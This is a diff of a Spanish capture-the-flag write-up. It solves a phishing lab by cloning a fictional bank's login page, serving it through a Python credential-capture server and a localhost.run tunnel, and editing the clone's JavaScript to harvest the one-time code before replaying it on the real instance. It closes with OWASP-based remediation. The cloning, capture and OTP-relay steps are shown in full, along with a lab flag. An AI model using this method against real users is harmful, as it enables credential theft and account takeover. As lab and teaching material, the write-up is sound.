@@ -8,15 +8,15 @@ La solución captura las credenciales y el OTP mediante una réplica del portal 
 
 ## 1. El desafío y la hipótesis
 
-El desafío pedía iniciar sesión como Gastón Díaz. La plataforma permitía indicar el dominio del desafío —con protocolo y sin ruta— y una URL completa para que el cliente la visitara. La visita solo podía solicitarse una vez por minuto, no admitía direcciones locales o internas y no debía atacarse. El enunciado ya hablaba de un sitio falso y advertía que, si Gastón veía algo sospechoso, cerraría la página.
+El desafío pide iniciar sesión como Gastón Díaz. La plataforma permite indicar el dominio del desafío —con protocolo y sin ruta— y una URL completa para que el cliente la visite. La visita solo puede solicitarse una vez por minuto, no admite direcciones locales o internas y no debe atacarse. El enunciado ya habla de un sitio falso y advierte que, si Gastón ve algo sospechoso, cierra la página.
 
-Al abrir la instancia, la página inicial era el login de VeltraBank, con los campos Usuario y Contraseña y el botón Continuar.
+Al abrir la instancia, la página inicial es el login de VeltraBank, con los campos Usuario y Contraseña y el botón Continuar.
 
 ![Login de VeltraBank en la instancia](assets/public-01-login.png)
 
 *Login inicial de VeltraBank, con los campos de usuario y contraseña.*
 
-Esa pantalla, junto con la posibilidad de enviar a Gastón a una URL y la advertencia de que cerraría una página sospechosa, llevó a la hipótesis de reproducir el portal para comprobar si introducía allí sus credenciales. El propio enunciado planteaba el sitio falso; había que comprobar si una página equivalente al banco bastaba.
+Esa pantalla, junto con la posibilidad de enviar a Gastón a una URL y la advertencia de que cierra una página sospechosa, nos lleva a la hipótesis de reproducir el portal para comprobar si introduce allí sus credenciales. El propio enunciado plantea el sitio falso; queda por comprobar si una página equivalente al banco basta.
 
 ## 2. La carpeta de trabajo y el servidor de login
 
@@ -32,7 +32,7 @@ wget --page-requisites --convert-links --adjust-extension \
 
 `--page-requisites` descarga los recursos referenciados por la página; `--convert-links` adapta los enlaces a las copias locales y `--adjust-extension` guarda el HTML como [`login.html`](replica/login.html). Con `--no-host-directories`, los recursos del banco quedan en `static/`, sin una carpeta adicional con el nombre del dominio. Las fuentes de Google siguen cargándose desde sus URLs originales.
 
-Para saber qué solicitud debía atender nuestro servidor, miramos el JavaScript de la página. En [`veltra.js`](replica/static/veltra.js), el primer formulario envía:
+Para saber qué solicitud debe atender nuestro servidor, miramos el JavaScript de la página. En [`veltra.js`](replica/static/veltra.js), el primer formulario envía:
 
 ```javascript
 var usuario = document.getElementById("txt-login").value.trim();
@@ -40,9 +40,9 @@ var clave = document.getElementById("txt-password").value;
 enviarJSON("/api/login", { usuario: usuario, clave: clave })
 ```
 
-El servidor debía recibir un `POST /api/login` con el JSON `{usuario, clave}` y mostrar esos valores en la terminal.
+El servidor debe recibir un `POST /api/login` con el JSON `{usuario, clave}` y mostrar esos valores en la terminal.
 
-Para que la visita funcione necesitamos dos procesos: el servidor Python que sirve la réplica y muestra las solicitudes, y un túnel que publica ese servidor mediante una URL pública. Mantendremos cada uno en una terminal.
+Para que la visita funcione necesitamos dos procesos: el servidor Python que sirve la réplica y muestra las solicitudes, y un túnel que publica ese servidor mediante una URL pública. Mantenemos cada uno en una terminal.
 
 Para servir la copia y registrar las credenciales enviadas, creamos [`servidor_login.py`](replica/servidor_login.py). Usa `http.server` de la biblioteca estándar, sirve el HTML, CSS y JavaScript, atiende el POST del formulario y muestra en la terminal el JSON recibido. La respuesta que devuelve es un rechazo simulado.
 
@@ -86,7 +86,7 @@ ssh -R 80:127.0.0.1:8001 nokey@localhost.run
 
 SSH mantiene el túnel y localhost.run anuncia una URL pública HTTPS. Esa URL es necesaria porque el cliente del desafío no puede entrar a `127.0.0.1`. La terminal A sigue con el servidor; la terminal B queda abierta con el túnel. Ambas deben permanecer abiertas.
 
-En nuestra primera visita, localhost.run anunció:
+En nuestra primera visita, localhost.run anuncia:
 
 ```text
 14d8e54d7808a4.lhr.life tunneled with tls termination, https://14d8e54d7808a4.lhr.life
@@ -98,13 +98,13 @@ La URL que se copia al formulario es la URL completa que comienza por `https://`
 
 *Línea de localhost.run con la URL HTTPS de la primera visita.*
 
-En el formulario del desafío escribimos el dominio de la instancia con protocolo y sin ruta, pegamos la URL HTTPS completa y pulsamos **Hacer que el cliente visite la URL**. El mensaje «El cliente de Veltra Bank está por iniciar sesión» confirmó que la visita se había puesto en marcha.
+En el formulario del desafío escribimos el dominio de la instancia con protocolo y sin ruta, pegamos la URL HTTPS completa y pulsamos **Hacer que el cliente visite la URL**. El mensaje «El cliente de Veltra Bank está por iniciar sesión» confirma que la visita está en marcha.
 
 ![Formulario del desafío con la URL de la réplica](assets/public-02-visita.png)
 
 *Formulario del desafío con el dominio del banco y la URL de la réplica; abajo, el mensaje de inicio de la visita.*
 
-Volvimos a la terminal A, donde el servidor registró la visita y el envío del formulario:
+Volvemos a la terminal A, donde el servidor registra la visita y el envío del formulario:
 
 ```text
 127.0.0.1 - - [19/Oct/2026 01:04:57] "GET /?probe=veltra-20261019-clone-01 HTTP/1.1" 200 -
@@ -112,19 +112,19 @@ TEST POST /api/login: {"usuario": "gaston.diaz", "clave": "Gaston$5.!@1990"}
 127.0.0.1 - - [19/Oct/2026 01:05:01] "POST /api/login HTTP/1.1" 200 -
 ```
 
-El `POST` contenía las credenciales y el servidor devolvió el rechazo simulado. Con esos datos, pasamos a la página original del banco.
+El `POST` contiene las credenciales y el servidor devuelve el rechazo simulado. Con esos datos, pasamos a la página original del banco.
 
 ## 4. El segundo factor
 
-Abrimos el login de la instancia en una pestaña y enviamos las credenciales capturadas. La API respondió:
+Abrimos el login de la instancia en una pestaña y enviamos las credenciales capturadas. La API responde:
 
 ```json
 {"next":"/verificar","ok":true}
 ```
 
-La respuesta es JSON; el JavaScript leyó `next` y cargó `/verificar`. Dejamos esa pestaña abierta, esperando completar la verificación.
+La respuesta es JSON; el JavaScript lee `next` y carga `/verificar`. Dejamos esa pestaña abierta, esperando completar la verificación.
 
-La pantalla mostraba el paso 2 de 2, el saludo a `gaston.diaz` y el campo para el código de seis dígitos.
+La pantalla muestra el paso 2 de 2, el saludo a `gaston.diaz` y el campo para el código de seis dígitos.
 
 ![Pantalla de verificación en dos pasos de la instancia bancaria](assets/public-04-paso-2.png)
 
@@ -158,7 +158,7 @@ El `nonce` es un valor de desafío, no el OTP. La respuesta de `/api/challenge` 
 
 Sin embargo, el código ingresado ya está disponible en `txt-2fa` antes de aplicar el hash. Como controlamos el JavaScript que sirve nuestra réplica, podemos modificarlo para que nos envíe directamente ese valor. La hipótesis es que Gastón complete también esta pantalla y que podamos usar su OTP en la verificación pendiente del banco.
 
-La réplica inicial no contemplaba esta pantalla. Para incorporarla, detenemos `servidor_login.py` con `Ctrl+C` en la terminal A y descargamos `/verificar` en la misma carpeta como [`verificacion-local.html`](replica/verificacion-local.html). Esta ruta requiere la sesión del banco: en las herramientas de desarrollo del navegador, pestaña **Red**, copiamos el valor del encabezado `Cookie` de una solicitud autenticada de la pestaña que dejamos esperando el segundo factor. Sustituimos el marcador del comando por ese valor:
+La réplica inicial no contempla esta pantalla. Para incorporarla, detenemos `servidor_login.py` con `Ctrl+C` en la terminal A y descargamos `/verificar` en la misma carpeta como [`verificacion-local.html`](replica/verificacion-local.html). Esta ruta requiere la sesión del banco: en las herramientas de desarrollo del navegador, pestaña **Red**, copiamos el valor del encabezado `Cookie` de una solicitud autenticada de la pestaña que dejamos esperando el segundo factor. Sustituimos el marcador del comando por ese valor:
 
 ```sh
 wget --header='Cookie: <valor del encabezado Cookie de la sesión del banco>' \
@@ -174,11 +174,11 @@ var codigo = document.getElementById("txt-2fa").value.trim();
 enviarJSON("/api/verificar", { codigo: codigo })
 ```
 
-Conservamos el resto del manejador, que muestra la respuesta del servidor. La réplica enviará `{"codigo":"..."}` a nuestro receptor; el portal original mantiene su intercambio con nonce y SHA-256. Después de editar el script, hacemos una recarga forzada del navegador (`Ctrl+F5`) para evitar que use la versión anterior en caché.
+Conservamos el resto del manejador, que muestra la respuesta del servidor. La réplica envía `{"codigo":"..."}` a nuestro receptor; el portal original mantiene su intercambio con nonce y SHA-256. Después de editar el script, hacemos una recarga forzada del navegador (`Ctrl+F5`) para evitar que use la versión anterior en caché.
 
 ## 6. La nueva visita
 
-La primera versión del servidor solo atendía el login. Para incorporar estas rutas, ampliamos el servidor y guardamos esta versión como [`servidor_completo.py`](replica/servidor_completo.py). Agrega el avance a `/verificar`, la página de verificación y `POST /api/verificar`, donde lee el campo `codigo` y lo imprime en la terminal. No son dos servicios simultáneos: ambas versiones usan la misma carpeta y el mismo puerto.
+La primera versión del servidor solo atiende el login. Para incorporar estas rutas, ampliamos el servidor y guardamos esta versión como [`servidor_completo.py`](replica/servidor_completo.py). Agrega el avance a `/verificar`, la página de verificación y `POST /api/verificar`, donde lee el campo `codigo` y lo imprime en la terminal. No son dos servicios simultáneos: ambas versiones usan la misma carpeta y el mismo puerto.
 
 En la misma terminal A arrancamos la versión completa:
 
@@ -211,15 +211,15 @@ LOCAL POST /api/verificar codigo=429989
 127.0.0.1 - - [20/Oct/2026 05:22:33] "POST /api/verificar HTTP/1.1" 200 -
 ```
 
-El receptor recibió directamente `429989`, el código que Gastón introdujo en la réplica. El OTP tiene una vigencia limitada y debemos usarlo enseguida. Si expira antes de completar el acceso, hay que solicitar otra visita y capturar el nuevo código.
+El receptor recibe directamente `429989`, el código que Gastón introduce en la réplica. El OTP tiene una vigencia limitada y debemos usarlo enseguida. Si expira antes de completar el acceso, hay que solicitar otra visita y capturar el nuevo código.
 
 ## 7. El acceso en el banco
 
-Volvimos a la pestaña del banco, escribimos `429989` y pulsamos **Confirmar e ingresar**. Lo usamos dentro de su vigencia.
+Volvemos a la pestaña del banco, escribimos `429989` y pulsamos **Confirmar e ingresar**. Lo usamos dentro de su vigencia.
 
-Al pulsar el botón, el JavaScript original del banco solicitó un challenge a la instancia, calculó `SHA-256(nonce + ":" + codigo)` con ese OTP y envió la respuesta a `/api/verificar`. El banco aceptó el código capturado.
+Al pulsar el botón, el JavaScript original del banco solicita un challenge a la instancia, calcula `SHA-256(nonce + ":" + codigo)` con ese OTP y envía la respuesta a `/api/verificar`. El banco acepta el código capturado.
 
-El navegador cargó `/dashboard` siguiendo `next`. La página identifica a `gaston.diaz`, muestra «Sesión verificada» y presenta la flag:
+El navegador carga `/dashboard` siguiendo `next`. La página identifica a `gaston.diaz`, muestra «Sesión verificada» y presenta la flag:
 
 ![Dashboard autenticado de Gastón Díaz con la flag](assets/public-06-dashboard.png)
 
@@ -227,20 +227,20 @@ El navegador cargó `/dashboard` siguiendo `next`. La página identifica a `gast
 
 **Flag:** `e769a8f5702bc47d98732409d2794756`
 
-El acceso quedó confirmado por la respuesta del verificador de la instancia y por el dashboard autenticado.
+La respuesta del verificador de la instancia y el dashboard autenticado confirman el acceso.
 
 ## 8. Síntesis
 
-La réplica permitió que Gastón llegara a un login controlado y entregara sus credenciales. En una nueva visita, también introdujo el OTP. Al modificar el JavaScript servido por nuestra copia, recibimos directamente el código en los logs.
+La réplica permite que Gastón llegue a un login controlado y entregue sus credenciales. En una nueva visita, también introduce el OTP. Al modificar el JavaScript servido por nuestra copia, recibimos directamente el código en los logs.
 
-Con el OTP capturado, volvimos a la pestaña del banco que seguía abierta y completamos la verificación dentro de su vigencia. El cálculo del hash en el navegador no impidió la captura: la réplica controlaba el código que leía el formulario. El dashboard confirmó el acceso como `gaston.diaz` y mostró la flag.
+Con el OTP capturado, volvemos a la pestaña del banco que sigue abierta y completamos la verificación dentro de su vigencia. El cálculo del hash en el navegador no impide la captura: la réplica controla el código que lee el formulario. El dashboard confirma el acceso como `gaston.diaz` y muestra la flag.
 
 ![Flujo de las dos visitas a la réplica, la captura directa del OTP y la verificación final desde nuestro navegador en el banco](assets/flujo-solucion.svg)
 
 ## 9. Remediación
 
-OWASP A07:2025 agrupa los fallos de autenticación, incluida la gestión inadecuada de factores y verificaciones ([A07:2025 — Authentication Failures](https://top10.owasp.org/2025/A07_2025-Authentication_Failures/)). En este caso, el banco ya validaba la respuesta en el servidor, pero el OTP podía capturarse en una réplica y usarse en el sitio legítimo. Calcular un hash antes de enviar el código no evita este ataque: quien controla la página falsa puede modificar su JavaScript y leer el valor antes de esa transformación.
+OWASP A07:2025 agrupa los fallos de autenticación, incluida la gestión inadecuada de factores y verificaciones ([A07:2025 — Authentication Failures](https://top10.owasp.org/2025/A07_2025-Authentication_Failures/)). En este caso, el banco ya valida la respuesta en el servidor, pero el OTP puede capturarse en una réplica y usarse en el sitio legítimo. Calcular un hash antes de enviar el código no evita este ataque: quien controla la página falsa puede modificar su JavaScript y leer el valor antes de esa transformación.
 
 Para resistir una réplica del portal, la defensa principal es la autenticación vinculada al origen, como WebAuthn/passkeys; OWASP reúne las recomendaciones de autenticación multifactor en su [Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html). La vigencia corta, el uso único, la invalidación y los límites de intentos son controles complementarios del OTP: no impiden por sí solos que una réplica capture el código que el usuario introduce y lo use a tiempo en el banco. Agregar otro nonce, otra capa de hash o cambiar únicamente el transporte tampoco resuelve el ataque.
 
-El paquete [`replica/`](replica/) reúne los archivos de apoyo de esta resolución: `login.html`, `static/`, `verificacion-local.html`, `servidor_login.py` y `servidor_completo.py`. No formó parte de los recursos entregados por el desafío; queda como material para reproducir el recorrido.
+El paquete [`replica/`](replica/) reúne los archivos de apoyo de esta resolución: `login.html`, `static/`, `verificacion-local.html`, `servidor_login.py` y `servidor_completo.py`. No forma parte de los recursos entregados por el desafío; queda como material para reproducir el recorrido.
